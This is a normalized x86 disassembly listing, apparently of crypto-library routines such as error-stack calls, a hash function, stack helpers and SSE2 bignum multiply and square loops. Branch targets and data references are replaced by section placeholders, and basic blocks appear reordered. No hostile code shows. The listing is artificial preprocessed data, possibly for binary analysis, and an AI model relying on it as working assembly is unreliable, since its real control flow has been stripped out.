mov [ ebp + esi * 4 ] eax
inc esi
add esp 0x8
cmp esi edi
jl r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
push eax
push esi
push ecx
call sub_4337b0
inc esi
add esp 0xc
cmp esi edi
jl r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov ecx [ ebx ]
push esi
push ecx
call sub_434860
add esp 0x8
xor eax eax
jmp r-xdata
mov ebx [ esp + 0x20 ]
mov eax [ ebx ]
test eax eax
je r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax ]
push edx
push ecx
mov ecx [ esp + 0x24 ]
push esi
lea edx [ esp + 0x1c ]
push edx
mov edx [ eax + 0x10 ]
push ebx
push ecx
call edx
add esp 0x18
sub_433b10
push ebx
mov ebx [ esp + 0x8 ]
push edi
xor edi edi
call sub_433500
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop ebx
retn
push ebp
push esi
push 0x1f4
push r--data
push 0x2
push 0x5
call sub_432950
mov eax [ ebx + 0x4 ]
push eax
call sub_434850
mov ebp eax
add esp 0x14
test ebp ebp
jle r-xdata
push 0x1ff
push r--data
push 0x2
push 0x6
call sub_432950
add esp 0x10
test ebp ebp
jle r-xdata
push 0x1f8
lea ecx [ ebp * 4 ]
push r--data
push ecx
call sub_431b40
mov edi eax
add esp 0xc
test edi edi
je r-xdata
mov ebx [ esp + 0x1c ]
xor esi esi
test ebp ebp
jle r-xdata
test edi edi
jne r-xdata
xor esi esi
test ebp ebp
jle r-xdata
test edi edi
je r-xdata
mov edi edi
push 0x202
push r--data
push 0x41
push 0x6b
push 0xf
call sub_4345f0
add esp 0x14
pop esi
pop ebp
pop edi
pop ebx
retn
mov edx [ ebx + 0x4 ]
push esi
push edx
call sub_434860
mov [ edi + esi * 4 ] eax
inc esi
add esp 0x8
cmp esi ebp
jl r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
push edi
call sub_431c30
add esp 0x4
inc esi
cmp esi ebp
jl r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
pop esi
pop ebp
push eax
call sub_434820
add esp 0x4
mov [ ebx ] 0x0
mov eax [ edi + esi * 4 ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov ecx [ edi + esi * 4 ]
mov edx [ ecx + 0x4 ]
push edx
mov edx [ ecx ]
mov ecx [ ecx + 0xc ]
push edx
push esi
push ebx
push eax
mov eax [ esp + 0x2c ]
push eax
call ecx
add esp 0x18
push eax
call sub_434850
add esp 0x4
cmp esi eax
jl r-xdata
mov eax [ ebx ]
push esi
push eax
call sub_434860
add esp 0x8
xor eax eax
jmp r-xdata
sub_433c50
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov ecx eax
shr ecx 0xc
xor ecx eax
shr ecx 0xc
and ecx 0xfff
xor ecx eax
mov eax 0xaf286bcb
mul ecx
mov eax ecx
sub eax edx
shr eax 0x1
add edx eax
shr edx 0x4
imul edx edx 0x13
mov eax ecx
sub eax edx
imul eax eax 0xd
xor eax ecx
retn
sub_433ca0
push esi
push 0x162
push r--data
push 0x1
push 0x9
xor esi esi
call sub_432950
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
mov esi eax
cmp [ esp + 0x8 ] esi
je r-xdata
push 0x16b
push r--data
push 0x1
push 0xa
call sub_432950
add esp 0x10
mov eax esi
pop esi
retn
push 0x165
push r--data
push r--data
call sub_431db0
push sub_433c90
push sub_433c50
call sub_432d00
add esp 0x14
mov [ rw-data ] eax
call sub_431f80
mov eax [ rw-data ]
test eax eax
je r-xdata
sub_433d20
push 0x172
push r--data
push 0x1
push 0x9
call sub_432950
mov eax [ rw-data ]
add esp 0x10
test eax eax
je r-xdata
push 0x178
push r--data
push 0x1
push 0xa
call sub_432950
add esp 0x10
retn
push eax
call sub_432a20
add esp 0x4
mov [ rw-data ] 0x0
sub_433d70
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov ecx [ eax ]
push esi
push 0x0
call ecx
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push 0x127
push r--data
push 0x1
push 0x9
call sub_432950
add esp 0x10
cmp [ rw-data ] 0x0
jne r-xdata
push 0x185
push r--data
push 0x1
push 0x5
call sub_432950
mov edx [ esp + 0x18 ]
push edx
push esi
call sub_432ed0
push 0x187
push r--data
push 0x1
push 0x6
mov esi eax
call sub_432950
add esp 0x28
mov eax esi
pop esi
retn
pop esi
retn
push 0x12a
push r--data
push 0x1
push 0xa
call sub_432950
add esp 0x10
mov [ rw-data ] r--data
sub_433e10
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov ecx [ eax ]
push esi
push 0x1
call ecx
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push 0x127
push r--data
push 0x1
push 0x9
call sub_432950
add esp 0x10
cmp [ rw-data ] 0x0
jne r-xdata
push 0x196
push r--data
push 0x1
push 0x9
call sub_432950
mov edx [ esp + 0x18 ]
push edx
push esi
call sub_432dd0
push 0x198
push r--data
push 0x1
push 0xa
mov esi eax
call sub_432950
add esp 0x28
mov eax esi
pop esi
retn
pop esi
retn
push 0x12a
push r--data
push 0x1
push 0xa
call sub_432950
add esp 0x10
mov [ rw-data ] r--data
sub_433eb0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov ecx [ eax ]
push esi
push 0x0
call ecx
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push 0x127
push r--data
push 0x1
push 0x9
call sub_432950
add esp 0x10
cmp [ rw-data ] 0x0
jne r-xdata
push 0x1a7
push r--data
push 0x1
push 0x9
call sub_432950
mov edx [ esp + 0x18 ]
push edx
push esi
call sub_432e60
push 0x1a9
push r--data
push 0x1
push 0xa
mov esi eax
call sub_432950
add esp 0x28
mov eax esi
pop esi
retn
pop esi
retn
push 0x12a
push r--data
push 0x1
push 0xa
call sub_432950
add esp 0x10
mov [ rw-data ] r--data
sub_433f80
push esi
push 0x1be
push r--data
push 0x1
push 0x9
xor esi esi
call sub_432950
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
inc [ rw-data ]
mov esi eax
cmp [ esp + 0x8 ] esi
je r-xdata
push 0x1ca
push r--data
push 0x1
push 0xa
call sub_432950
add esp 0x10
mov eax esi
pop esi
retn
push 0x1c1
push r--data
push r--data
call sub_431db0
push j_sub_4325e0
push sub_433f50
call sub_432d00
add esp 0x14
mov [ rw-data ] eax
call sub_431f80
mov eax [ rw-data ]
test eax eax
je r-xdata
sub_434010
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi ] 0x0
je r-xdata
push 0x1d5
push r--data
push 0x1
push 0xffffffff
push rw-data
call sub_4329d0
add esp 0x14
test eax eax
jg r-xdata
mov [ esi ] 0x0
sub_434050
mov eax 0x4
call sub_43a7f0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov ecx [ eax + 0x14 ]
push 0x0
call ecx
add esp 0x4
mov [ esp ] eax
test eax eax
jne r-xdata
push 0x127
push r--data
push 0x1
push 0x9
call sub_432950
add esp 0x10
cmp [ rw-data ] 0x0
jne r-xdata
push esi
push 0x1ef
push r--data
push 0x1
push 0x5
call sub_432950
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
push edx
push eax
call sub_432ed0
push 0x1f1
push r--data
push 0x1
push 0x6
mov esi eax
call sub_432950
mov edx [ rw-data ]
mov eax [ edx + 0x18 ]
lea ecx [ esp + 0x2c ]
push ecx
call eax
add esp 0x2c
mov eax esi
pop esi
pop ecx
retn
pop ecx
retn
push 0x12a
push r--data
push 0x1
push 0xa
call sub_432950
add esp 0x10
mov [ rw-data ] r--data
sub_434110
mov eax 0x4
call sub_43a7f0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov ecx [ eax + 0x14 ]
push 0x1
call ecx
add esp 0x4
mov [ esp ] eax
test eax eax
jne r-xdata
push 0x127
push r--data
push 0x1
push 0x9
call sub_432950
add esp 0x10
cmp [ rw-data ] 0x0
jne r-xdata
push esi
push 0x201
push r--data
push 0x1
push 0x9
call sub_432950
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
push edx
push eax
call sub_432dd0
push 0x203
push r--data
push 0x1
push 0xa
mov esi eax
call sub_432950
mov edx [ rw-data ]
mov eax [ edx + 0x18 ]
lea ecx [ esp + 0x2c ]
push ecx
call eax
add esp 0x2c
mov eax esi
pop esi
pop ecx
retn
pop ecx
retn
push 0x12a
push r--data
push 0x1
push 0xa
call sub_432950
add esp 0x10
mov [ rw-data ] r--data
sub_4341d0
push esi
push 0x227
push r--data
push 0x1
push 0x9
call sub_432950
mov eax [ rw-data ]
push 0x229
push r--data
mov esi eax
inc eax
push 0x1
push 0xa
mov [ rw-data ] eax
call sub_432950
add esp 0x20
mov eax esi
pop esi
retn
sub_434210
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push edi
add esi 0x88
mov edi 0x10
mov [ esi + 0x40 ] 0x0
add esi 0x4
dec edi
jne r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
jmp sub_431c30
push eax
call sub_431c30
add esp 0x4
mov [ esi ] 0x0
sub_434260
mov eax 0x19c
call sub_43a7f0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x198 ] eax
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
lea eax [ esp + 0xc ]
push eax
call sub_4325a0
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
call sub_432640
mov ecx [ rw-data ]
mov edx [ ecx + 0x1c ]
lea eax [ esp + 0x20 ]
push eax
call edx
mov esi eax
add esp 0x10
cmp esi edi
jne r-xdata
push 0x127
push r--data
push 0x1
push 0x9
call sub_432950
add esp 0x10
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ esp + 0x1a4 ]
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
add esp 0x19c
retn
push 0x3fb
push r--data
push 0x190
call sub_431b40
mov esi eax
add esp 0xc
cmp esi edi
je r-xdata
push 0x12a
push r--data
push 0x1
push 0xa
call sub_432950
add esp 0x10
mov [ rw-data ] r--data
pop edi
pop esi
mov eax rw-data
pop ebx
mov ecx [ esp + 0x198 ]
xor ecx esp
call sub_437c1c
add esp 0x19c
retn
lea eax [ esp + 0xc ]
push eax
push esi
call sub_432640
add esp 0x8
mov [ esi + 0x188 ] edi
mov [ esi + 0x18c ] edi
lea eax [ esi + 0xc8 ]
mov ecx 0x10
jmp r-xdata
mov [ eax - 0x40 ] edi
mov [ eax ] edi
add eax 0x4
dec ecx
jne r-xdata
mov ecx [ rw-data ]
mov edx [ ecx + 0x20 ]
push esi
call edx
mov ebx eax
mov eax [ rw-data ]
mov ecx [ eax + 0x1c ]
push esi
call ecx
add esp 0x8
cmp eax esi
je r-xdata
cmp ebx edi
je r-xdata
push esi
call sub_434210
add esp 0x4
push ebx
call sub_434210
add esp 0x4
sub_4343c0
mov eax 0x8
call sub_43a7f0
push ebx
push esi
push edi
push 0x431
push r--data
push 0x51
mov esi 0x50
call sub_431b40
mov ebx eax
xor edi edi
add esp 0xc
cmp ebx edi
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x8
retn
push ebp
mov [ ebx ] 0x0
mov [ esp + 0x10 ] edi
cmp [ esp + 0x1c ] edi
jle r-xdata
call sub_434260
mov edi eax
mov esi [ edi + 0x188 ]
test esi esi
jne r-xdata
lea eax [ esp + 0x1c ]
mov eax [ edi + esi * 4 + 0x88 ]
test eax eax
je r-xdata
mov esi 0xf
mov ecx [ esp + 0x10 ]
inc ecx
mov [ esp + 0x10 ] ecx
cmp ecx [ esp + 0x1c ]
jl r-xdata
mov eax ebp
lea edx [ eax + 0x1 ]
mov [ edi + esi * 4 + 0x88 ] ebx
mov [ edi + esi * 4 + 0xc8 ] 0x3
pop ebp
test [ edi + esi * 4 + 0xc8 ] 0x1
je r-xdata
mov ebp [ eax + 0x4 ]
add eax 0x4
mov [ esp + 0x14 ] eax
test ebp ebp
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add edi eax
cmp edi esi
jle r-xdata
push eax
call sub_431c30
add esp 0x4
mov [ edi + esi * 4 + 0x88 ] 0x0
lea ecx [ esi + 0x1 ]
push ecx
push ebp
push ebx
call sub_432f40
mov eax [ esp + 0x20 ]
add esp 0xc
push 0x441
lea esi [ edi + 0x14 ]
push r--data
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_431bb0
add esp 0x10
test eax eax
je r-xdata
push ebx
call sub_431c30
add esp 0x4
pop ebp
pop edi
pop esi
pop ebx
add esp 0x8
retn
mov ebx eax
sub_4344e0
mov eax 0x4
call sub_43a7f0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov ecx [ eax + 0x14 ]
push 0x0
call ecx
add esp 0x4
mov [ esp ] eax
test eax eax
je r-xdata
push 0x127
push r--data
push 0x1
push 0x9
call sub_432950
add esp 0x10
cmp [ rw-data ] 0x0
jne r-xdata
pop ecx
retn
push esi
push 0x213
push r--data
push 0x1
push 0x9
call sub_432950
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
push edx
push eax
call sub_432e60
add esp 0x18
cmp [ rw-data ] 0x1
mov esi eax
jne r-xdata
push 0x12a
push r--data
push 0x1
push 0xa
call sub_432950
add esp 0x10
mov [ rw-data ] r--data
push 0x21c
push r--data
push 0x1
push 0xa
call sub_432950
mov eax [ rw-data ]
mov ecx [ eax + 0x18 ]
lea edx [ esp + 0x14 ]
push edx
call ecx
add esp 0x14
test esi esi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop esi
push esi
call sub_434210
add esp 0x4
push eax
call sub_432cf0
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push ecx
call sub_432a20
add esp 0x4
mov [ rw-data ] 0x0
sub_4345f0
push esi
push edi
call sub_434260
mov esi eax
mov eax [ esi + 0x188 ]
inc eax
and eax 0x8000000f
jns r-xdata
mov ecx [ esi + 0x18c ]
mov [ esi + 0x188 ] eax
cmp eax ecx
jne r-xdata
dec eax
or eax 0xfffffff0
inc eax
movzx ecx [ esp + 0xc ]
mov edx [ esp + 0x14 ]
xor edi edi
mov [ esi + eax * 4 + 0x8 ] edi
mov eax [ esp + 0x10 ]
and eax 0xfff
shl eax 0xc
shl ecx 0x18
or eax ecx
mov ecx [ esi + 0x188 ]
and edx 0xfff
or eax edx
mov [ esi + ecx * 4 + 0x48 ] eax
mov edx [ esi + 0x188 ]
mov eax [ esp + 0x18 ]
mov [ esi + edx * 4 + 0x108 ] eax
mov ecx [ esi + 0x188 ]
mov edx [ esp + 0x1c ]
mov [ esi + ecx * 4 + 0x148 ] edx
mov eax [ esi + 0x188 ]
cmp [ esi + eax * 4 + 0x88 ] edi
je r-xdata
inc ecx
and ecx 0x8000000f
jns r-xdata
mov [ esi + eax * 4 + 0xc8 ] edi
pop edi
pop esi
retn
test [ esi + eax * 4 + 0xc8 ] 0x1
je r-xdata
mov [ esi + 0x18c ] ecx
dec ecx
or ecx 0xfffffff0
inc ecx
mov ecx eax
mov [ esi + ecx * 4 + 0xc8 ] edi
pop edi
pop esi
retn
mov eax [ esi + eax * 4 + 0x88 ]
push eax
call sub_431c30
mov ecx [ esi + 0x188 ]
mov [ esi + ecx * 4 + 0x88 ] edi
mov edx [ esi + 0x188 ]
add esp 0x4
mov [ esi + edx * 4 + 0xc8 ] edi
pop edi
pop esi
retn
sub_4346e0
push esi
push edi
push 0x7d
push r--data
push 0x14
call sub_431b40
mov esi eax
xor edi edi
add esp 0xc
cmp esi edi
je r-xdata
pop edi
xor eax eax
pop esi
retn
push 0x7f
push r--data
push 0x10
call sub_431b40
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
jne r-xdata
mov [ eax ] edi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x4 ] edi
mov edx [ esi + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx + 0x8 ] edi
mov eax [ esi + 0x4 ]
mov [ eax + 0xc ] edi
mov [ esi ] edi
mov [ esi + 0x8 ] edi
pop edi
mov [ esi + 0x10 ] ecx
mov [ esi + 0xc ] 0x4
mov eax esi
pop esi
retn
push esi
call sub_431c30
add esp 0x4
sub_434750
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov ecx [ esi ]
mov eax [ esi + 0xc ]
inc ecx
cmp eax ecx
jg r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
push ebx
mov ebx [ esp + 0x14 ]
cmp ebx eax
jge r-xdata
push 0x96
lea edx [ eax * 8 ]
mov eax [ esi + 0x4 ]
push r--data
push edx
push eax
call sub_431bb0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ esp + 0x10 ]
mov [ ecx + eax * 4 ] edx
inc [ esi ]
mov eax [ esi ]
pop ebx
mov [ esi + 0x8 ] 0x0
pop esi
retn
test ebx ebx
js r-xdata
mov ecx [ esi + 0xc ]
add ecx ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0xc ] ecx
mov edx [ esi + 0x4 ]
push edi
lea edi [ edx + 0x4 ]
cmp eax ebx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax [ esp + 0x14 ]
mov [ edx + ebx * 4 ] eax
inc [ esi ]
mov eax [ esi ]
pop edi
pop ebx
mov [ esi + 0x8 ] 0x0
pop esi
retn
lea ecx [ edi + eax * 4 ]
sub eax ebx
sub edx edi
inc eax
mov edi [ edx + ecx ]
mov [ ecx ] edi
sub ecx 0x4
dec eax
jne r-xdata
sub_434820
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_431c30
add esp 0x4
push eax
call sub_431c30
add esp 0x4
sub_434860
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ esp + 0x8 ]
test eax eax
js r-xdata
cmp eax [ ecx ]
jge r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
retn
sub_434880
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
xor eax eax
retn
mov ecx [ esp + 0x8 ]
test ecx ecx
js r-xdata
cmp ecx [ eax ]
jge r-xdata
mov edx [ eax + 0x4 ]
mov eax [ esp + 0xc ]
mov [ edx + ecx * 4 ] eax
retn
sub_4348c0
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn
push esi
xor esi esi
cmp [ edi ] esi
jle r-xdata
mov eax [ edi + 0x4 ]
pop esi
test eax eax
je r-xdata
push ebx
mov ebx [ esp + 0x14 ]
push edi
call sub_431c30
add esp 0x4
push eax
call sub_431c30
add esp 0x4
inc esi
cmp esi [ edi ]
jl r-xdata
mov ecx [ eax ]
push ecx
call ebx
add esp 0x4
mov eax [ edi + 0x4 ]
cmp [ eax + esi * 4 ] 0x0
lea eax [ eax + esi * 4 ]
je r-xdata
pop ebx
sub_434940
lea eax [ rw-data ]
bt [ eax ] 0x1a
jae r-xdata
push ebp
push ebx
push esi
push edi
xor esi esi
mov edi [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
mov ebx [ esp + 0x18 ]
and ecx 0xfffffff8
mov ebp [ esp + 0x20 ]
push ecx
je r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
movd mmx0 [ esp + 0x10 ]
pxor mmx1 mmx1
jmp r-xdata
mov ecx [ esp + 0x20 ]
and ecx 0x7
jne r-xdata
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
test ecx 0xfffffff8
jne r-xdata
mov eax [ ebx ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi ]
adc edx 0x0
dec ecx
mov [ edi ] eax
mov esi edx
je r-xdata
jmp r-xdata
mov eax [ ebx ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi ]
adc edx 0x0
mov [ edi ] eax
mov esi edx
mov eax [ ebx + 0x4 ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi + 0x4 ]
adc edx 0x0
mov [ edi + 0x4 ] eax
mov esi edx
mov eax [ ebx + 0x8 ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi + 0x8 ]
adc edx 0x0
mov [ edi + 0x8 ] eax
mov esi edx
mov eax [ ebx + 0xc ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi + 0xc ]
adc edx 0x0
mov [ edi + 0xc ] eax
mov esi edx
mov eax [ ebx + 0x10 ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi + 0x10 ]
adc edx 0x0
mov [ edi + 0x10 ] eax
mov esi edx
mov eax [ ebx + 0x14 ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi + 0x14 ]
adc edx 0x0
mov [ edi + 0x14 ] eax
mov esi edx
mov eax [ ebx + 0x18 ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi + 0x18 ]
adc edx 0x0
mov [ edi + 0x18 ] eax
mov esi edx
mov eax [ ebx + 0x1c ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi + 0x1c ]
adc edx 0x0
mov [ edi + 0x1c ] eax
mov esi edx
sub ecx 0x8
lea ebx [ ebx + 0x20 ]
lea edi [ edi + 0x20 ]
jne r-xdata
movd mm3 [ eax ]
paddq mmx1 mm3
movd mm2 [ edx ]
pmuludq mm2 mmx0
movd mm4 [ edx + 0x4 ]
pmuludq mm4 mmx0
movd mm6 [ edx + 0x8 ]
pmuludq mm6 mmx0
movd mm7 [ edx + 0xc ]
pmuludq mm7 mmx0
paddq mmx1 mm2
movd mm3 [ eax + 0x4 ]
paddq mm3 mm4
movd mm5 [ eax + 0x8 ]
paddq mm5 mm6
movd mm4 [ eax + 0xc ]
paddq mm7 mm4
movd [ eax ] mmx1
movd mm2 [ edx + 0x10 ]
pmuludq mm2 mmx0
psrlq mmx1 0x20
movd mm4 [ edx + 0x14 ]
pmuludq mm4 mmx0
paddq mmx1 mm3
movd mm6 [ edx + 0x18 ]
pmuludq mm6 mmx0
movd [ eax + 0x4 ] mmx1
psrlq mmx1 0x20
movd mm3 [ edx + 0x1c ]
add edx 0x20
pmuludq mm3 mmx0
paddq mmx1 mm5
movd mm5 [ eax + 0x10 ]
paddq mm2 mm5
movd [ eax + 0x8 ] mmx1
psrlq mmx1 0x20
paddq mmx1 mm7
movd mm5 [ eax + 0x14 ]
paddq mm4 mm5
movd [ eax + 0xc ] mmx1
psrlq mmx1 0x20
paddq mmx1 mm2
movd mm5 [ eax + 0x18 ]
paddq mm6 mm5
movd [ eax + 0x10 ] mmx1
psrlq mmx1 0x20
paddq mmx1 mm4
movd mm5 [ eax + 0x1c ]
paddq mm3 mm5
movd [ eax + 0x14 ] mmx1
psrlq mmx1 0x20
paddq mmx1 mm6
movd [ eax + 0x18 ] mmx1
psrlq mmx1 0x20
paddq mmx1 mm3
movd [ eax + 0x1c ] mmx1
lea eax [ eax + 0x20 ]
psrlq mmx1 0x20
sub ecx 0x8
je r-xdata
nop
nop
mov eax esi
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x4 ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi + 0x4 ]
adc edx 0x0
dec ecx
mov [ edi + 0x4 ] eax
mov esi edx
je r-xdata
movd eax mmx1
emms
retn
movd mm2 [ edx ]
movd mm3 [ eax ]
pmuludq mm2 mmx0
lea edx [ edx + 0x4 ]
paddq mmx1 mm3
paddq mmx1 mm2
movd [ eax ] mmx1
sub ecx 0x1
psrlq mmx1 0x20
lea eax [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi + 0x8 ]
adc edx 0x0
dec ecx
mov [ edi + 0x8 ] eax
mov esi edx
je r-xdata
mov eax [ ebx + 0xc ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi + 0xc ]
adc edx 0x0
dec ecx
mov [ edi + 0xc ] eax
mov esi edx
je r-xdata
mov eax [ ebx + 0x10 ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi + 0x10 ]
adc edx 0x0
dec ecx
mov [ edi + 0x10 ] eax
mov esi edx
je r-xdata
mov eax [ ebx + 0x14 ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi + 0x14 ]
adc edx 0x0
dec ecx
mov [ edi + 0x14 ] eax
mov esi edx
je r-xdata
mov eax [ ebx + 0x18 ]
mul ebp
add eax esi
adc edx 0x0
add eax [ edi + 0x18 ]
adc edx 0x0
mov [ edi + 0x18 ] eax
mov esi edx
sub_434cb0
lea eax [ rw-data ]
bt [ eax ] 0x1a
jae r-xdata
push ebp
push ebx
push esi
push edi
xor esi esi
mov edi [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
mov ebp [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
and ebp 0xfffffff8
je r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
movd mmx0 [ esp + 0x10 ]
pxor mmx1 mmx1
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov ebp [ esp + 0x1c ]
and ebp 0x7
jne r-xdata
mov eax [ ebx ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi ] eax
mov esi edx
mov eax [ ebx + 0x4 ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi + 0x4 ] eax
mov esi edx
mov eax [ ebx + 0x8 ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi + 0x8 ] eax
mov esi edx
mov eax [ ebx + 0xc ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi + 0xc ] eax
mov esi edx
mov eax [ ebx + 0x10 ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi + 0x10 ] eax
mov esi edx
mov eax [ ebx + 0x14 ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi + 0x14 ] eax
mov esi edx
mov eax [ ebx + 0x18 ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi + 0x18 ] eax
mov esi edx
mov eax [ ebx + 0x1c ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi + 0x1c ] eax
mov esi edx
add ebx 0x20
add edi 0x20
sub ebp 0x8
je r-xdata
movd mm2 [ edx ]
pmuludq mm2 mmx0
lea edx [ edx + 0x4 ]
paddq mmx1 mm2
movd [ eax ] mmx1
sub ecx 0x1
psrlq mmx1 0x20
lea eax [ eax + 0x4 ]
jne r-xdata
movd eax mmx1
emms
retn
mov eax [ ebx ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi ] eax
mov esi edx
dec ebp
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x4 ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi + 0x4 ] eax
mov esi edx
dec ebp
je r-xdata
mov eax [ ebx + 0x8 ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi + 0x8 ] eax
mov esi edx
dec ebp
je r-xdata
mov eax [ ebx + 0xc ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi + 0xc ] eax
mov esi edx
dec ebp
je r-xdata
mov eax [ ebx + 0x10 ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi + 0x10 ] eax
mov esi edx
dec ebp
je r-xdata
mov eax [ ebx + 0x14 ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi + 0x14 ] eax
mov esi edx
dec ebp
je r-xdata
mov eax [ ebx + 0x18 ]
mul ecx
add eax esi
adc edx 0x0
mov [ edi + 0x18 ] eax
mov esi edx
sub_434ea0
lea eax [ rw-data ]
bt [ eax ] 0x1a
jae r-xdata
push ebp
push ebx
push esi
push edi
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
mov ebx [ esp + 0x1c ]
and ebx 0xfffffff8
je r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
nop
nop
nop
nop
mov ebx [ esp + 0x1c ]
and ebx 0x7
je r-xdata
mov eax [ edi ]
mul eax
mov [ esi ] eax
mov [ esi + 0x4 ] edx
mov eax [ edi + 0x4 ]
mul eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax [ edi + 0x8 ]
mul eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edx
mov eax [ edi + 0xc ]
mul eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
mov eax [ edi + 0x10 ]
mul eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] edx
mov eax [ edi + 0x14 ]
mul eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] edx
mov eax [ edi + 0x18 ]
mul eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] edx
mov eax [ edi + 0x1c ]
mul eax
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] edx
add edi 0x20
add esi 0x40
sub ebx 0x8
jne r-xdata
movd mmx0 [ edx ]
pmuludq mmx0 mmx0
lea edx [ edx + 0x4 ]
movq [ eax ] mmx0
sub ecx 0x1
lea eax [ eax + 0x8 ]
jne r-xdata
emms
retn
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mul eax
mov [ esi ] eax
dec ebx
mov [ esi + 0x4 ] edx
je r-xdata
mov eax [ edi + 0x4 ]
mul eax
